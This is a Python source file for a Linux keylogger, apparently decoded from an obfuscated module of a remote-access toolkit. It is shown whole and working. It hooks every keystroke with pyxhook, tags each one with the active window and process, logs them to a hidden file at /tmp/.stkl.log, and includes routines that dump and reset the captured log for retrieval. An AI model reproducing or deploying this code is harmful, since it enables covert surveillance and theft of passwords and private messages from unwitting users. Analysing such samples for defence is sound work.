#!/usr/bin/env python3
# Decoded from Configuration/st_lnx_keylogger.py
# Original was obfuscated with exec(SEC(INFO(...)))


import os
import sys
import time
import pyxhook
import datetime
import threading

class keylogger():

    def __init__(self):
        self.kl_status = False
        self.active_window = ''
        self.active_proc = ''
        self.log_file = '/tmp/.stkl.log'

    def start(self):
        self.log_handle = open(self.log_file,'a')
        self.kl_status = True
        self.key_count = 0
        now = datetime.datetime.now()
        start_time=now.strftime("%Y-%m-%d %H:%M:%S")
        kl_summary = "\n[ {} ] - Keylogger is now running".format(start_time)
        self.log_handle.write(kl_summary)
        self.thread = threading.Thread(target=self.run)
        self.thread.start()

    def run(self):
        self.kl_hook=pyxhook.HookManager()
        self.kl_hook.KeyDown=self.KeyStroke
        self.kl_hook.HookKeyboard()
        self.kl_hook.start()

    def KeyStroke(self,event):
        if self.kl_status:
            kl_summary = ''
            self.check_active_win(event.WindowName, event.WindowProcName)
            if self.key_count > 75:
                self.log_handle.write("\n")
                self.key_count = 0
            if len(event.Key) > 1:
                self.log_handle.write('[{}]'.format(event.Key))
                self.key_count += len(event.Key) + 2
            else:
                self.log_handle.write(event.Key)
                self.key_count += 1

    def check_active_win(self, win_name, win_proc):
        if win_name != self.active_window or win_proc != self.active_proc:
            self.active_window = win_name
            self.active_proc = win_proc
            now = datetime.datetime.now()
            start_time=now.strftime("%Y-%m-%d %H:%M:%S")
            kl_summary = "\n\n[ {} ] - {}: {}\n".format(start_time,self.active_window,self.active_proc)
            self.log_handle.write(kl_summary)

    def stop(self):
        self.kl_status = False
        self.kl_hook.cancel()
        now = datetime.datetime.now()
        end_time=now.strftime("%Y-%m-%d %H:%M:%S")
        kl_summary = "\n\n[ {} ] - Keylogger has been stopped\n".format(end_time)
        self.log_handle.write(kl_summary)
        self.log_handle.close()

    def get_status(self):
        return self.kl_status

    def dump_logs(self):
        with open(self.log_file,'rb') as s:
            resp = ''
            data = s.readlines()
            for line in data:
                resp += line
        return resp

    def get_dump(self):
        if self.get_status():
            self.kl_status = False
            self.log_handle.close()
            resp=self.dump_logs()
            self.log_handle = open(self.log_file,'w')
            self.kl_status = True
            self.active_window = ''
            self.active_proc = ''
            self.key_count = 0
        else:
            resp=self.dump_logs()
        return str(resp)
